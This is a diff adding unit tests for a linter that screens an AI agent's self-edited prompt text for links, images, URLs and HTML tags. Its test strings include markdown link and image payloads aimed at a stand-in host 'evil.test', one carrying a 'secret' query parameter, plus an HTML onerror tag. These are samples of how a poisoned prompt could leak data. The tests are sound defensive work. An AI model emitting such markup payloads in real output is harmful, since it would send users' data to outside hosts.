@@ -14,6 +14,7 @@ from jbrain.agent.selfedit import (
     SELF_EDIT_LOCKED,
     PromptEditError,
     build_prompt_edit_spec,
+    lint_proposed_body,
     self_editable_targets,
     unified_diff,
 )
@@ -187,3 +188,17 @@ def test_build_spec_packs_a_record_only_leaf_with_the_diff(tree: Path) -> None:
 
 def test_unified_diff_is_empty_for_identical_text() -> None:
     assert unified_diff("same\n", "same\n", rel_path="x.prompt") == ""
+
+
+def test_lint_passes_a_clean_body() -> None:
+    assert lint_proposed_body("Be concise. Always give the raw number first.") == []
+
+
+def test_lint_rejects_egress_and_markup_surfaces() -> None:
+    # Each is an external-load / markup surface a poisoned draft must not smuggle in (#9).
+    assert lint_proposed_body("See [docs](http://evil.test/exfil)")  # markdown link + URL
+    assert lint_proposed_body("![x](http://evil.test/p.png?d=secret)")  # markdown image
+    assert lint_proposed_body("Visit https://evil.test for more")  # bare URL
+    assert lint_proposed_body("Render <img src=x onerror=1>")  # HTML tag
+    # Every violation carries the #9 attribution so the refusal is legible.
+    assert all("#9" in r for r in lint_proposed_body("[a](http://b) <i>c</i>"))
